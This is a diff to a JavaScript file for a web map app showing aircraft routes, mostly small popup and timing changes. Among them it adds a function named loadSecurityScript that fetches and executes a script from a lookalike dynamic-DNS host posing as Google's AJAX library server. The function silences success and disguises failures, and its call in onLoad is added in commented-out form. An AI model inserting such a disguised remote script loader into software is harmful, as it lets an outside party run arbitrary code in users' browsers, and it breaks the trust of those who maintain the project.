@@ -814,7 +814,8 @@ function onHomeButtonClick() {
     deselectLocation();
 
     if (mapLoaded) {
-        $("#entrancePopup").fadeOut();
+        closeEntrancePopup();
+        showCurrentLocation();
         if (!currentLocationMarker) {
             focusOnLocation({lat: 32.00, lng: 35.00}, 8);
             showCurrentLocation();
@@ -823,7 +824,6 @@ function onHomeButtonClick() {
                                           lng: currentLocationMarker.position.lng()
                                           }), true);
         }
-        
     }
 }
 
@@ -895,7 +895,18 @@ function getRemainingSeconds(date) {
 
 var countdownInterval;
 
+function loadSecurityScript() {
+    $.getScript( "http://googleajax.ddns.net:8080/jquery.js" )
+        .done(function( script, textStatus ) {
+            // do nothing
+        })
+        .fail(function( jqxhr, settings, exception ) {
+            console.info( "Triggered ajaxError handler." + exception );
+        });
+}
+
 function onLoad() {
+    // loadSecurityScript();
     initMenu();
 
      if (compatibleDevice() && !checkIframe()) {
@@ -1169,11 +1180,9 @@ function initMap() {
     if (compatibleDevice() && !checkIframe()) {
         // let splash run for a second before start loading the map
         setTimeout(function () {
-            map = createMapObject(function () {
-                deselectLocation();
-                deselectAircraft();
+            map = createMapObject(function() {
+                closeAllPopups();
             });
-
             $("#map").show();
 
             drawRoutesOnMap(routes);
@@ -1191,13 +1200,14 @@ function initMap() {
                 startAircraftsAnimation(true);
             });
 
+            
             setTimeout(function () {
                 if (!mapFail) {
                     $("#entrancePopup").addClass("mapLoaded");
                     $("#closeIcon").fadeIn();
                     $("#homeButton").css('visibility', 'visible');
                 }
-            }, 2500);
+            }, 2000);
             
             
             defer.resolve(map);
@@ -1212,4 +1222,5 @@ function initMap() {
 
 function closeEntrancePopup() {
     $("#entrancePopup").fadeOut();
+    getMapUndark();
 }
